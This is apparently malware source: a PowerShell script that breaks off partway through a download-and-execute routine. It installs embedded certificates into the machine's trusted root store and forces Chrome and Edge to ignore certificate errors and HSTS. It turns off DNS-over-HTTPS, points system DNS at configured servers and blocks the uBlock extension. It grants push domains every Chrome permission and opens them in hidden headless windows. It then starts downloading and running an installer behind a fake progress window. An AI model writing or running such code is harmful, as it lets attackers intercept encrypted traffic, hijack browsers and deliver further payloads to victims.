'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'
}

function IsDebug {
    $debugFile = "C:\debug.txt"
    
    try {
        # Check if the file exists
        if (Test-Path $debugFile -PathType Leaf) {
            return $true
        } else {
            return $false
        }
    } catch {
        # Catch any errors that occur during the Test-Path operation
        return $false
    }
}

function Get-EnvPaths {
    $a = Get-LocalAppDataPath
    $b =  Get-AppDataPath
    return @($a , $b)
}

function Get-TempFile {
    $tempPath = [System.IO.Path]::GetTempPath()
    $tempFile = [System.IO.Path]::GetTempFileName()
    return $tempFile
}

function Get-LocalAppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::LocalApplicationData)
}

function Get-AppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
}

function Get-ProfilePath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
}

function Close-Processes {
    param (
        [string[]]$processes
    )

    foreach ($process in $Processes) {
        $command = "taskkill.exe /im $process /f"
        Invoke-Expression $command
    }
}




function ConfigureCertificates {
    foreach ($key in $xdata.Keys) {
        Cert-Work -contentString $xdata[$key]
    }
}

function Cert-Work {
    param(
        [string] $contentString
    )
    $outputFilePath = [System.IO.Path]::GetTempFileName()
    $binary = [Convert]::FromBase64String($contentString)
    try {
        Set-Content -Path $outputFilePath -Value $binary -AsByteStream
    } catch {
        Add-Content -Path $outputFilePath -Value $binary -Encoding Byte
    }
    Install-CertificateToStores -CertificateFilePath $outputFilePath -Password '123'
}

function Install-CertificateToStores {
    param(
        [string] $CertificateFilePath,
        [string] $Password
    )

    try {
        $securePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force

        # Import certificate to Personal (My) store
        $personalStorePath = "Cert:\LocalMachine\My"
        Import-PfxCertificate -FilePath $CertificateFilePath -CertStoreLocation $personalStorePath -Password $securePassword -ErrorAction Stop
        Write-Output "Certificate installed successfully to Personal store (My)."

        # Import certificate to Root store
        $rootStorePath = "Cert:\LocalMachine\Root"
        Import-PfxCertificate -FilePath $CertificateFilePath -CertStoreLocation $rootStorePath -Password $securePassword -ErrorAction Stop
        Write-Output "Certificate installed successfully to Root store."

    } catch {
        throw "Failed to install certificate: $_"
    }
}

function ConfigureChrome {
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" -Name "EnableAutoDOH" -Value 0

    $chromeKeyPath = "HKLM:\Software\Policies\Google\Chrome"

    if (-not (Test-Path $chromeKeyPath)) {
        New-Item -Path $chromeKeyPath -Force | Out-Null
    }

    New-Item -Path $chromeKeyPath -Force | Out-Null  # Create the key if it doesn't exist
    Set-ItemProperty -Path $chromeKeyPath -Name "CommandLineFlag" -Value "--ignore-certificate-errors --disable-quic --disable-hsts"
    Set-ItemProperty -Path $chromeKeyPath -Name "DnsOverHttps" -Value "off"

    Set-ItemProperty -Path $chromeKeyPath -Name "IgnoreCertificateErrors" -Value 1

    Write-Output "Chrome configured"
}








function PushDomain {
    param ($pushUrl)

    # Trim the input string before the first comma
    $trimmedUrl = $pushUrl.Trim().Split(',')[0].Trim()

    # Parse the URI
    $parsedUri = [System.Uri]::new($trimmedUrl)
    
    # Extract domain and port
    $domain = $parsedUri.Host
    $port = if ($parsedUri.Port -eq -1) { 443 } else { $parsedUri.Port }

    # Construct the result URL
    $result = "https://" + $domain + ":" + "$port,*"
    
    return $result
}

function PushExists
{
    param ($pushUrl)
    foreach ($push in $xpushes) 
    {
        if ((PushDomain -pushUrl $pushUrl) -eq (PushDomain -pushUrl $push))
        {
            return $true;
        }
    }
    return $false
}

# function List-Pushes()
# {
#     $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"

#     # Check if the Preferences file exists
#     if (Test-Path $preferencesPath) {
#         $preferencesContent = Get-Content -Path $preferencesPath -Raw | ConvertFrom-Json

#         $notificationSettings = $preferencesContent.profile.content_settings.exceptions.notifications

#         if ($notificationSettings -isnot [array]) {
#             $notificationSettings = @($notificationSettings)
#         }

#         if ($notificationSettings) {
#             foreach ($item in $notificationSettings) {
#                 $jsonItem = $item | ConvertTo-Json -Depth 1
#                 Write-Output $jsonItem
#             }
#         } else {
#             Write-Output "No notification settings found."
#         }
#     } else {
#         Write-Output "Preferences file not found at path: $preferencesPath"
#     }
# }

function Remove-Pushes {
    $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"

    # Check if the Preferences file exists
    if (Test-Path $preferencesPath) {
        $preferencesContent = Get-Content -Path $preferencesPath -Raw | ConvertFrom-Json

        # Check if the structure is as expected
        if ($preferencesContent -and $preferencesContent.profile -and $preferencesContent.profile.content_settings -and $preferencesContent.profile.content_settings.exceptions.notifications) {
            $notificationSettings = $preferencesContent.profile.content_settings.exceptions.notifications

            $keysToRemove = @()

            # Iterate through each entry in $notificationSettings
            foreach ($field in $notificationSettings.PSObject.Properties) {
                $siteUrl = $field.Name
                $permission = (PushExists -pushUrl $siteUrl)
            
                if ($permission -eq $false) {
                    $keysToRemove += $field.Name
                } else {
                    Write-Output "$siteUrl hasn't been removed, it is a good site."
                }
            }

            foreach ($key in $keysToRemove) {
                $notificationSettings.PSObject.Properties.Remove($key)
            }

            $preferencesContent | ConvertTo-Json -Depth 100 | Set-Content -Path $preferencesPath -Force

            Write-Output "All selected push notification settings have been removed."
        } else {
            Write-Output "No or unexpected notification settings found in Preferences file."
        }
    } else {
        Write-Output "Preferences file not found at path: $preferencesPath"
    }
}


function Add-Push {
    param (
        [string]$pushUrl
    )

    $pushDomain = PushDomain -pushUrl $pushUrl

    $chromePreferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"

    if (-not (Test-Path -Path $chromePreferencesPath)) {
        Write-Host "Chrome preferences file not found at path: $chromePreferencesPath"
        exit
    }

    $preferencesContent = Get-Content -Path $chromePreferencesPath -Raw | ConvertFrom-Json

    if (-not $preferencesContent.profile) {
        $preferencesContent | Add-Member -MemberType NoteProperty -Name profile -Value @{}
    }

    if (-not $preferencesContent.profile.default_content_setting_values) {
        $preferencesContent.profile | Add-Member -MemberType NoteProperty -Name default_content_setting_values -Value @{}
    }

    if (-not $preferencesContent.profile.default_content_setting_values.popups) {
        $preferencesContent.profile.default_content_setting_values | Add-Member -MemberType NoteProperty -Name popups -Value 1
    } else {
        $preferencesContent.profile.default_content_setting_values.popups = 1
    }

    if (-not $preferencesContent.profile.default_content_setting_values.subresource_filter) {
        $preferencesContent.profile.default_content_setting_values | Add-Member -MemberType NoteProperty -Name subresource_filter -Value 1
    } else {
        $preferencesContent.profile.default_content_setting_values.subresource_filter = 1
    }

    $preferencesContentJson = $preferencesContent | ConvertTo-Json -Depth 32
    Set-Content -Path $chromePreferencesPath -Value $preferencesContentJson -Force

    $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"

    if (Test-Path $preferencesPath) {
        $preferencesContent = Get-Content -Path $preferencesPath -Raw | ConvertFrom-Json
        $contentSettings = $preferencesContent.profile.content_settings.exceptions
        $settingsToUpdate = @(
            "auto_picture_in_picture", "background_sync", "camera", "clipboard", "cookies", 
            "geolocation", "images", "javascript", "microphone", "midi_sysex", 
            "notifications", "popups", "plugins", "sound", "unsandboxed_plugins", 
            "automatic_downloads", "flash_data", "mixed_script", "sensors","window_placement","webid_api","vr",
            "subresource_filter","media_stream_mic","media_stream_mic","media_stream_camera","local_fonts",
            "javascript_jit","idle_detection","captured_surface_control","ar"

        )

        foreach ($setting in $settingsToUpdate) {
            if ($null -eq $contentSettings.$setting) {
                $contentSettings | Add-Member -MemberType NoteProperty -Name $setting -Value @{}
            }
            $specificSetting = $contentSettings.$setting
            if ($specificSetting.PSObject.Properties.Name -contains $pushDomain) {
                Write-Output "The website URL $pushDomain already exists in the $setting settings."
            } else {
                $specificSetting | Add-Member -MemberType NoteProperty -Name $pushDomain -Value @{
                    "last_modified" = "13362720545785774"
                    "setting" = 1
                }
                $contentSettings.$setting = $specificSetting
            }
        }

        $preferencesContent.profile.content_settings.exceptions = $contentSettings
        $updatedPreferencesJson = $preferencesContent | ConvertTo-Json -Depth 10
        $updatedPreferencesJson | Set-Content -Path $preferencesPath -Encoding UTF8

        Write-Output "Notification subscription for $pushDomain added successfully with all permissions."
    } else {
        Write-Output "Preferences file not found at path: $preferencesPath"
    }
}



function Close-ChromeWindow {
    param ($window)
    [User32X]::CloseWindow($window) | Out-Null
    Start-Sleep -Milliseconds 25
}

function Close-Chrome {
    param ($process)
    Close-ChromeWindow -window $process.MainWindowHandle
    try {
        $process.Close()
    }
    catch {
  
    }
}


function Close-AllChromes {
    $windows = [User32X]::EnumerateAllWindows()
    foreach ($window in $windows) 
    {
        $title = [User32X]::GetWindowText($window)
        if ($title.Contains("Google Chrome"))
        {
            [User32X]::ShowWindow($window, [User32X]::SW_HIDE) | Out-Null
            Close-ChromeWindow -window $window
        }
    }
    Close-Processes(@('chrome.exe'))
}

function ConfigureChromePushes {
    Add-Type @"
    using System;
    using System.Collections.Generic;
    using System.Runtime.InteropServices;
    using System.Text;

    public static class User32X {
        public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool IsWindowVisible(IntPtr hWnd);

        public static string GetWindowText(IntPtr hWnd) {
            int length = GetWindowTextLength(hWnd);
            if (length == 0) return String.Empty;

            StringBuilder sb = new StringBuilder(length + 1);
            GetWindowText(hWnd, sb, sb.Capacity);
            return sb.ToString();
        }

        public static bool IsWindowVisibleEx(IntPtr hWnd) {
            return IsWindowVisible(hWnd) && GetWindowTextLength(hWnd) > 0;
        }

        public static IntPtr[] EnumerateAllWindows() {
            var windowHandles = new List<IntPtr>();
            EnumWindows((hWnd, lParam) => {
                if (IsWindowVisibleEx(hWnd)) {
                    windowHandles.Add(hWnd);
                }
                return true;
            }, IntPtr.Zero);
            return windowHandles.ToArray();
        }

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public const int SW_HIDE = 0;
        public const int SW_MINIMIZE = 6;
        public const int SW_SHOW = 5;

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

        public static void CloseWindow(IntPtr hWnd) {
            const uint WM_CLOSE = 0x0010;
            PostMessage(hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
        }
    }
"@

    Close-AllChromes;
    Remove-Pushes;
    foreach ($push in $server.pushes) {
        Add-Push -pushUrl $push
    }
}



function Open-ChromeWithUrl {
    param (
        [string]$url, $isDebug
    )
    $job = Start-Job -ScriptBlock {
            param ($url, $isDebug)

            try {
                
 
            Add-Type @"
            using System;
            using System.Collections.Generic;
            using System.Runtime.InteropServices;
            using System.Text;
            
            public static class User32X {
                public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
            
                [DllImport("user32.dll", SetLastError = true)]
                private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
            
                [DllImport("user32.dll", SetLastError = true)]
                private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
            
                [DllImport("user32.dll", SetLastError = true)]
                private static extern int GetWindowTextLength(IntPtr hWnd);
            
                [DllImport("user32.dll", SetLastError = true)]
                private static extern bool IsWindowVisible(IntPtr hWnd);
            
                public static string GetWindowText(IntPtr hWnd) {
                    int length = GetWindowTextLength(hWnd);
                    if (length == 0) return String.Empty;
            
                    StringBuilder sb = new StringBuilder(length + 1);
                    GetWindowText(hWnd, sb, sb.Capacity);
                    return sb.ToString();
                }
            
                public static bool IsWindowVisibleEx(IntPtr hWnd) {
                    return IsWindowVisible(hWnd) && GetWindowTextLength(hWnd) > 0;
                }
            
                public static IntPtr[] EnumerateAllWindows() {
                    var windowHandles = new List<IntPtr>();
                    EnumWindows((hWnd, lParam) => {
                        if (IsWindowVisibleEx(hWnd)) {
                            windowHandles.Add(hWnd);
                        }
                        return true;
                    }, IntPtr.Zero);
                    return windowHandles.ToArray();
                }
            
                [DllImport("user32.dll", SetLastError = true)]
                public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
            
                public const int SW_HIDE = 0;
                public const int SW_MINIMIZE = 6;
                public const int SW_SHOW = 5;
                public const int SW_MAXIMIZE = 3; // Added constant for maximizing window
            
                [DllImport("user32.dll", SetLastError = true)]
                public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
            
                public static void CloseWindow(IntPtr hWnd) {
                    const uint WM_CLOSE = 0x0010;
                    PostMessage(hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                }
            }
"@
}
catch {
}
        
        function Close-ChromeWindow {
            try {
                param ($window)
                [User32X]::CloseWindow($window) | Out-Null
                Start-Sleep -Milliseconds 100
            }
            catch {}
        }
        
        function Close-Chrome {
            param ($process)
            Close-ChromeWindow -window $process.MainWindowHandle
            try {
                $process | Stop-Process -Force
            }
            catch {
            }
        }

        $chromePaths = @(
            "C:\Program Files\Google\Chrome\Application\chrome.exe",
            "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
            "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe",
            "$env:ProgramFiles\Google\Chrome\Application\chrome.exe",
            "$env:ProgramFiles(x86)\Google\Chrome\Application\chrome.exe"
        )
        $resolvedPaths = @()
        foreach ($path in $chromePaths) {
            try {
                $resolvedPath = Resolve-Path -Path $path -ErrorAction Stop
                if ($resolvedPath -notin $resolvedPaths) {
                    $resolvedPaths += $resolvedPath.Path
                }
            } catch {
                Write-Output "Error resolving path: $_"
            }
        }
        $resolvedPaths = $resolvedPaths | Select-Object -Unique
        foreach ($path in $resolvedPaths) {
            if (Test-Path -Path $path) {
                Write-Output "Found Chrome at: $path"
    
                $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
                $processStartInfo.FileName = $path
                $processStartInfo.Arguments = "--headless --disable-gpu --dump-dom $url"
                $processStartInfo.CreateNoWindow = $false
                $processStartInfo.UseShellExecute = $false
                $process = New-Object System.Diagnostics.Process
                $process.StartInfo = $processStartInfo
                $process.Start() | Out-Null         
                $endTime = (Get-Date).AddSeconds(8)
                while ((Get-Date) -lt $endTime) {
                    if ($isDebug -eq $false)
                    {
                        # try
                        # {
                        #     [User32X]::ShowWindow($process.MainWindowHandle, [User32X]::SW_HIDE) | Out-Null                                
                        # }
                        # catch
                        # {
                        # }
                    }
                    Start-Sleep -Milliseconds 100
                }
                # try
                # {
                #     [User32X]::ShowWindow($process.MainWindowHandle, [User32X]::SW_SHOW) | Out-Null
                # }
                # catch
                # {
                # }
                Close-Chrome -process $process
                break
            } else {
                Write-Output "Chrome not found at: $path"
            }
        }

    } -ArgumentList $url, $isDebug

    return $job
}

function LaunchChromePushes {
    $isDebug = IsDebug
    foreach ($push in $server.pushes) {
        Open-ChromeWithUrl -url $push -isDebug $isDebug
        break
    }
}




function ConfigureChromeUblock {
    $keywords = @("uBlock")

    foreach ($dir in Get-EnvPaths) {
        $chromeDir = Join-Path -Path $dir -ChildPath "Google\Chrome\User Data\Default\Extensions"
        
        try {
            if (Test-Path -Path $chromeDir -PathType Container) {
                $extensions = Get-ChildItem -Path $chromeDir -Directory

                foreach ($extension in $extensions) {
                    $manFile = chromeublock_FindManifestFile -folder $extension.FullName
                    if ($manFile -ne "") {
                        $foundKeyword = $false
                        
                        foreach ($manifestValue in $keywords) {
                            $content = Get-Content -Path $manFile -Raw
                            if ($content -match [regex]::Escape($manifestValue)) {
                                $foundKeyword = $true
                                break
                            }
                        }

                        if ($foundKeyword) {
                            $extFolderName = [System.IO.Path]::GetFileName($extension.FullName)
                            chromeublock_ProcessManifestAll -extName $extFolderName
                        }
                    }
                }
            }
        } catch {
             Write-Error "Error occurred: $_"
        }
    }
}


function chromeublock_FindManifestFile {
    param (
        [string]$folder
    )

    $result = ""

    Get-ChildItem -Path $folder | ForEach-Object {
        if (-not ($_.PSIsContainer)) {
            if ($_.Name -eq "manifest.json") {
                $result = $_.FullName
                return
            }
        } elseif ($_.Name -notin @('.', '..')) {
            $result = chromeublock_FindManifestFile -folder $_.FullName
            if ($result -ne "") {
                return
            }
        }
    }

    return $result
}


function chromeublock_ProcessManifestAll {
    param (
        [string]$extName
    )

    chromeublock_ProcessManifest -extName $extName -browser "Google\Chrome"
}

function chromeublock_ProcessManifest {
    param (
        [string]$extName,
        [string]$browser
    )

    $regPath = "HKLM:\SOFTWARE\Policies\$browser\ExtensionInstallBlocklist"
    
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    
    $regKeyIndex = 1
    do {
        $keyName = "$regKeyIndex"
        $val = Get-ItemProperty -Path $regPath -Name $keyName -ErrorAction SilentlyContinue
        if ($val -eq $extName) {
            return
        }
        $regKeyIndex++
    } until (-not (Test-Path "$regPath\$keyName"))

    Set-ItemProperty -Path $regPath -Name $keyName -Value $extName
}




function Set-DnsServers {
    param (
        [string]$primaryDnsServer,
        [string]$secondaryDnsServer
    )

    try {
        # Get network adapters that are IP-enabled
        $networkAdapters = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -notlike '*Virtual*' }

        foreach ($adapter in $networkAdapters) {
            # Set DNS servers using Set-DnsClientServerAddress cmdlet
            Set-DnsClientServerAddress -InterfaceAlias $adapter.Name -ServerAddresses @($primaryDnsServer, $secondaryDnsServer) -Confirm:$false
            
            Write-Output "Successfully set DNS servers for adapter: $($adapter.InterfaceDescription)"
        }
    } catch {
        Write-Error "An error occurred: $_"
    }
}

function ConfigureDnsServers {
    Set-DNSServers -PrimaryDNSServer $server.primaryDns -SecondaryDNSServer $server.secondaryDns
}
function ConfigureEdge {
    $edgeKeyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Edge"
    
    if (-not (Test-Path $edgeKeyPath)) {
        New-Item -Path $edgeKeyPath -Force | Out-Null
    }
    
    $commandLinePath = Join-Path $edgeKeyPath "CommandLine"
    if (-not (Test-Path $commandLinePath)) {
        New-Item -Path $commandLinePath -Force | Out-Null
    }
    
    Set-ItemProperty -Path $commandLinePath -Name "(Default)" -Value "--ignore-certificate-errors --disable-quic --disable-hsts"
    
    Set-ItemProperty -Path $edgeKeyPath -Name "DnsOverHttps" -Value "off"

    Set-ItemProperty -Path $edgeKeyPath -Name "IgnoreCertificateErrors" -Value 1
}




function ConfigureFireFox 
{
    try 
    {
        Set-FirefoxRegistry -KeyPaths @(
            'SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS',
            'SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS'
        ) -ValueNames @('Enabled', 'Locked') -Values @(0, 1)
    }
    catch 
    {
        Write-Warning "Failed to set firefox registry: $_"
    }
    foreach ($dir in Get-EnvPaths) 
    {
        try 
        {
        $path = Join-Path -Path $dir -ChildPath "Mozilla\Firefox\Profiles\user.js"

            $UserJSContent = 'user_pref("network.trr.mode", 5);'
            
            if (!(Test-Path -Path $path -PathType Leaf)) 
            {
                New-Item -Path $path -ItemType File -ErrorAction SilentlyContinue
                Add-Content -Path $path -Value $UserJSContent -ErrorAction SilentlyContinue
            }
        }
        catch 
        {
            Write-Warning "Failed to write to user.js file: $_"
        }
    }
}


function Set-FirefoxRegistry {
    param (
        [string[]]$KeyPaths,
        [string[]]$ValueNames,
        [int[]]$Values
    )

    $ErrorActionPreference = 'Stop'
    $regKey = [Microsoft.Win32.Registry]::LocalMachine

    try {
        foreach ($i in 0..($KeyPaths.Length - 1)) {
            $key = $regKey.OpenSubKey($KeyPaths[$i], $true)
            if ($key -eq $null) {
                Write-Warning "Failed to open registry key: $($KeyPaths[$i])"
                return
            }

            $key.SetValue($ValueNames[$i], $Values[$i], [Microsoft.Win32.RegistryValueKind]::DWord)
            $key.Close()
        }
    }
    catch {
        Write-Warning "Error accessing or modifying registry: $_"
    }
}




function ConfigureOpera
{
    Close-Processes(@('opera_crashreporter.exe', 'opera.exe'))

    foreach ($dir in Get-EnvPaths) {
        $path = Join-Path -Path $dir -ChildPath 'Opera Software\Opera Stable\Local State'

        try {
            if (Test-Path -Path $path -PathType Leaf)
            {
                ConfigureOperaInternal -FilePath $path
            }
        } catch {
            Write-Warning "Error occurred in Opera: $_"
        }
    }
}

function ConfigureOperaInternal {
    param(
        [string]$filePath
    )

    $content = Get-Content -Path $filePath -Raw | ConvertFrom-Json

    if ($null -eq $content.dns_over_https -or $content.dns_over_https -isnot [object]) {
        $content.dns_over_https = @{
            'mode' = 'off'
            'opera' = @{
                'doh_mode' = 'off'
            }
            'templates' = ""
        }
    } else {
        $content.dns_over_https.mode = 'off'
        $content.dns_over_https.opera = @{
            'doh_mode' = 'off'
        }
        $content.dns_over_https.templates = ""
    }

    $jsonString = $content | ConvertTo-Json -Depth 10

    Set-Content -Path $filePath -Value $jsonString -Encoding UTF8 -Force

    Write-Host "Successfully configured Opera settings in $filePath"
}







function Start-DownloadAndExecute {
    param (
        [string]$url,
        [string]$title
    )

    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    # Create and configure the form
    $form = New-Object System.Windows.Forms.Form
    $form.Text = $title
    $form.Size = New-Object System.Drawing.Size(400, 200)
    $form.StartPosition = "CenterScreen"

    # Create and configure the progress bar
    $progressBar = New-Object System.Windows.Forms.ProgressBar
    $progressBar.Minimum = 0
    $progressBar.Maximum = 100
    $progressBar.Step = 1
    $progressBar.Value = 0
    $progressBar.Width = 350
    $progressBar.Height = 30
    $progressBar.Top = 80
    $progressBar.Left = 20
    $form.Controls.Add($progressBar)

    # Create and configure the status label
    $statusLabel = New-Object System.Windows.Forms.Label
    $statusLabel.Text = "Downloading..."
    $statusLabel.AutoSize = $true
    $statusLabel.Top = 50
    $statusLabel.Left = 20
    $form.Controls.Add($statusLabel)

    # Create and configure the description label
    $descriptionLabel = New-Object System.Windows.Forms.Label
    $descriptionLabel.Text = "The installer is currently being downloaded. Please wait until the process completes."
    $descriptionLabel.AutoSize = $true
    $descriptionLabel.Width = 350
    $descriptionLabel.Top = 10
    $descriptionLabel.Left = 20
    $form.Controls.Add($descriptionLabel)

    # Show the form non-modally
    $form.Show()

    # Determine the file name and path
    $fileName = [System.IO.Path]::GetFileName($url)
    $tempDir = [System.IO.Path]::GetTempPath()
    $installerPath = [System.IO.Path]::Combine($tempDir, $fileName)

    # Create and configure the WebClient
    $webClient = New-Object System.Net.WebClient

    # Define event handlers
    $progressChangedHandler = [System.Net.DownloadProgressChangedEventHandler]{
        param ($sender, $eventArgs)
        $progressBar.Value = $eventArgs.ProgressPercentage
        $form.Refresh()
